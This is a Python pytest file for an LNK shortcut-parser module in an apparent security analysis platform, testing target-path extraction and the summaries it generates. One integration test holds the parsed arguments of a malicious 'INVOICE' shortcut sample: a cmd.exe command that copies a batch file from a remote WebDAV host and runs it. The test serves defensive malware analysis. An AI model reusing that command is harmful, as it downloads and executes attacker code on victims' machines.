import os
import pytest

from saq.configuration.config import get_analysis_module_config
from saq.constants import ANALYSIS_MODULE_LNK_PARSER, F_FILE, AnalysisExecutionResult
from saq.modules.file_analysis.lnk_parser import LnkParseAnalysis, LnkParseAnalyzer, get_target_path
from tests.saq.test_util import create_test_context


@pytest.mark.unit
class TestGetTargetPath:

    def test_normal_path_with_volume_and_files(self):
        """test extracting target path from normal lnk file with volume and file entries"""
        info = {
            "target": {
                "items": [
                    {
                        "class": "Root Folder",
                        "guid": "20D04FE0-3AEA-1069-A2D8-08002B30309D",
                        "sort_index": "My Computer",
                        "sort_index_value": 80
                    },
                    {
                        "class": "Volume Item",
                        "data": "C:\\",
                        "flags": "0xf"
                    },
                    {
                        "class": "File entry",
                        "file_attribute_flags": 16,
                        "file_size": 0,
                        "flags": "Is directory",
                        "modification_time": None,
                        "primary_name": "Windows"
                    },
                    {
                        "class": "File entry",
                        "file_attribute_flags": 16,
                        "file_size": 0,
                        "flags": "Is directory",
                        "modification_time": None,
                        "primary_name": "system32"
                    },
                    {
                        "class": "File entry",
                        "file_attribute_flags": 0,
                        "file_size": 0,
                        "flags": "Is file",
                        "modification_time": None,
                        "primary_name": "wscript.exe"
                    }
                ]
            }
        }

        result = get_target_path(info)
        assert result == "C:\\Windows\\system32\\wscript.exe"

    def test_empty_info(self):
        """test with empty info dict"""
        info = {}
        result = get_target_path(info)
        assert result is None

    def test_invalid_item_type(self):
        """test with non-dict item in items list"""
        info = {
            "target": {
                "items": [
                    "invalid string item",
                    {
                        "class": "Volume Item",
                        "data": "C:\\"
                    },
                    {
                        "class": "File entry",
                        "primary_name": "test.exe"
                    }
                ]
            }
        }

        result = get_target_path(info)
        assert result == "C:\\test.exe"

    def test_item_without_class(self):
        """test with item missing class field"""
        info = {
            "target": {
                "items": [
                    {
                        "data": "C:\\"
                    },
                    {
                        "class": "File entry",
                        "primary_name": "test.exe"
                    }
                ]
            }
        }

        result = get_target_path(info)
        assert result == "test.exe"

    def test_volume_item_without_data(self):
        """test with volume item missing data field"""
        info = {
            "target": {
                "items": [
                    {
                        "class": "Volume Item",
                        "flags": "0xf"
                    },
                    {
                        "class": "File entry",
                        "primary_name": "test.exe"
                    }
                ]
            }
        }

        result = get_target_path(info)
        assert result == "test.exe"

    def test_file_entry_without_primary_name(self):
        """test with file entry missing primary_name field"""
        info = {
            "target": {
                "items": [
                    {
                        "class": "Volume Item",
                        "data": "C:\\"
                    },
                    {
                        "class": "File entry",
                        "file_attribute_flags": 16,
                        "file_size": 0
                    },
                    {
                        "class": "File entry",
                        "primary_name": "test.exe"
                    }
                ]
            }
        }

        result = get_target_path(info)
        assert result == "C:\\test.exe"

    def test_multiple_volume_items_uses_last_absolute(self):
        """test that multiple volume items result in ntpath.join using the last absolute path"""
        info = {
            "target": {
                "items": [
                    {
                        "class": "Volume Item",
                        "data": "C:\\"
                    },
                    {
                        "class": "Volume Item",
                        "data": "D:\\"
                    },
                    {
                        "class": "File entry",
                        "primary_name": "test.exe"
                    }
                ]
            }
        }

        result = get_target_path(info)
        # volumes are inserted at position 0 in reverse order: ['D:\\', 'C:\\', 'test.exe']
        # ntpath.join treats C:\ as absolute path and ignores D:\ before it
        assert result == "C:\\test.exe"

    def test_all_items_invalid_returns_none(self):
        """test that if no valid items are found, returns None"""
        info = {
            "target": {
                "items": [
                    {
                        "class": "Unknown Class",
                        "data": "ignored"
                    },
                    {
                        "class": "Volume Item"
                        # missing data field
                    },
                    {
                        "class": "File entry"
                        # missing primary_name field
                    }
                ]
            }
        }

        result = get_target_path(info)
        assert result is None


@pytest.mark.unit
class TestLnkParseAnalysis:
    
    def test_init(self):
        analysis = LnkParseAnalysis()
        assert analysis.error is None
        assert analysis.info == {}

    def test_generate_summary_with_error(self):
        analysis = LnkParseAnalysis()
        analysis.error = "Parse failed"
        
        summary = analysis.generate_summary()
        assert summary == "LnkParse Analysis: Parse failed"
    
    def test_generate_summary_no_info(self):
        analysis = LnkParseAnalysis()
        analysis.error = None
        analysis.info = {}
        
        summary = analysis.generate_summary()
        assert summary is None
    
    def test_generate_summary_multiple_fields(self):
        analysis = LnkParseAnalysis()
        analysis.error = None
        analysis.info = {
            "data": {
                "command_line_arguments": "test cmd",
                "icon_location": "test icon",
                "working_directory": "test dir"
            },
            "target": {
                "items": [
                    {
                        "class": "Volume Item",
                        "data": "C:\\"
                    },
                    {
                        "class": "File entry",
                        "primary_name": "test.exe"
                    }
                ]
            }
        }

        summary = analysis.generate_summary()
        expected = "LnkParse Analysis: target path: (C:\\test.exe), command line arguments: (test cmd), icon location: (test icon), working directory: (test dir)"
        assert summary == expected
    
    def test_generate_summary_partial_fields(self):
        analysis = LnkParseAnalysis()
        analysis.error = None
        analysis.info = {
            "data": {
                "command_line_arguments": "test cmd",
                "working_directory": "test dir"
            }
        }
        
        summary = analysis.generate_summary()
        expected = "LnkParse Analysis: command line arguments: (test cmd), working directory: (test dir)"
        assert summary == expected


@pytest.mark.integration
class TestLnkParseAnalyzer:
    
    def test_valid_observable_types(self):
        analyzer = LnkParseAnalyzer(
            context=create_test_context(),
            config=get_analysis_module_config(ANALYSIS_MODULE_LNK_PARSER))
        assert analyzer.valid_observable_types == F_FILE
    
    def test_execute_analysis_file_not_exists(self, root_analysis, tmpdir, caplog):
        analyzer = LnkParseAnalyzer(
            context=create_test_context(root=root_analysis),
            config=get_analysis_module_config(ANALYSIS_MODULE_LNK_PARSER))
        
        # create a file observable for non-existent file by first creating it, then adding it, then deleting it
        test_file = tmpdir / "temp.lnk"
        test_file.write("temp content")
        file_observable = root_analysis.add_file_observable(str(test_file))
        # the observable is a copy in the root's storage: remove that one
        os.remove(file_observable.full_path)

        result = analyzer.execute_analysis(file_observable)
        assert result == AnalysisExecutionResult.COMPLETED
        assert file_observable.get_analysis(LnkParseAnalysis) is None
        assert f"cannot find local file path {file_observable.full_path}" in caplog.text
    
    def test_execute_analysis_not_lnk_file(self, root_analysis, tmpdir):
        analyzer = LnkParseAnalyzer(
            context=create_test_context(root=root_analysis),
            config=get_analysis_module_config(ANALYSIS_MODULE_LNK_PARSER))
        
        # create a non-lnk file
        test_file = tmpdir / "test.txt"
        test_file.write("this is not a lnk file")
        
        file_observable = root_analysis.add_file_observable(str(test_file))
        
        result = analyzer.execute_analysis(file_observable)
        assert result == AnalysisExecutionResult.COMPLETED
        
        # should not have created any analysis
        analysis = file_observable.get_analysis(LnkParseAnalysis)
        assert analysis is None
        
        # should not have added lnk tag
        assert not file_observable.has_tag("lnk")
    
    def test_execute_analysis_invoice_lnk_target_path(self, root_analysis, datadir):
        """test target_path extraction from INVOICE malicious lnk sample"""
        analyzer = LnkParseAnalyzer(
            context=create_test_context(root=root_analysis),
            config=get_analysis_module_config(ANALYSIS_MODULE_LNK_PARSER))

        file_observable = root_analysis.add_file_observable(str(datadir / "INVOICE#BUSAPOMKDS03.lnk"))
        result = analyzer.execute_analysis(file_observable)
        assert result == AnalysisExecutionResult.COMPLETED

        assert file_observable.has_tag("lnk")
        analysis = file_observable.get_analysis(LnkParseAnalysis)
        assert analysis is not None
        assert not analysis.error

        # the parsed info is also written out as a JSON file, added as an observable
        assert [obs.file_name for obs in analysis.observables] == [f"{file_observable.file_name}.lnkparser.json"]
        assert os.path.exists(file_observable.full_path + ".lnkparser.json")

        # validate target_path
        assert analysis.target_path == "C:\\Windows\\System32\\cmd.exe"

        # validate other fields
        assert analysis.command_line_arguments == '/c copy "\\\\posters-dial.com@80\\google\\file.bat" "%USERPROFILE%\\Music\\file.bat" && "%USERPROFILE%\\Music\\file.bat"'
        assert analysis.icon_location == "%SystemRoot%\\System32\\SHELL32.dll"
        assert analysis.working_directory == "\\\\posters-dial.com@80\\google"

        # validate summary includes target_path
        summary = analysis.generate_summary()
        assert summary is not None
        assert "target path: (C:\\Windows\\System32\\cmd.exe)" in summary
        assert "command line arguments:" in summary
        assert "icon location:" in summary
        assert "working directory:" in summary

    def test_execute_analysis_lnk_file_parsing_error(self, root_analysis, tmpdir):
        analyzer = LnkParseAnalyzer(
            context=create_test_context(root=root_analysis),
            config=get_analysis_module_config(ANALYSIS_MODULE_LNK_PARSER))
        
        # create a fake lnk file that will cause parsing error
        test_file = tmpdir / "fake.lnk"
        # write lnk file header but with very short/incomplete content to trigger parsing error
        with open(str(test_file), "wb") as f:
            f.write(b"L\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00F")  # too short for valid lnk
        
        file_observable = root_analysis.add_file_observable(str(test_file))
        
        result = analyzer.execute_analysis(file_observable)
        assert result == AnalysisExecutionResult.COMPLETED
        
        # should have added lnk tag
        assert file_observable.has_tag("lnk")
        
        # should have created analysis with error
        analysis = file_observable.get_analysis(LnkParseAnalysis)
        assert analysis is not None
        assert isinstance(analysis, LnkParseAnalysis)
        assert analysis.error is not None
        assert isinstance(analysis.error, str)